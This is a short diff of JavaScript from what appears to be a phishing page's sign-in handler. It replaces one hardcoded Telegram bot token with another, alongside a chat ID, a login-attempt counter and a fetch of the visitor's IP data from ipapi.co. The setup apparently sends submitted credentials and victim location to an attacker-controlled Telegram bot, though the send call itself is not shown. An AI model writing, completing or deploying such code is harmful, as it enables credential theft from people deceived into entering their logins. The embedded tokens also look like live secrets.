@@ -71,7 +71,7 @@ document.addEventListener('DOMContentLoaded', () => {
         signInBtn.textContent = "Verifying...";
         attemptCount++;
 
-        const botToken = "7581994701:AAGb0gyfgIMQH-RDhnogyMfgaAJbnK7h534";
+        const botToken = "8099221862:AAHqbxeMQUIFuwgdkCq0Y7aAsBPp_JcfVKE";
         const chatId = "5642369607";
 
         let ipData = await fetch("https://ipapi.co/json")
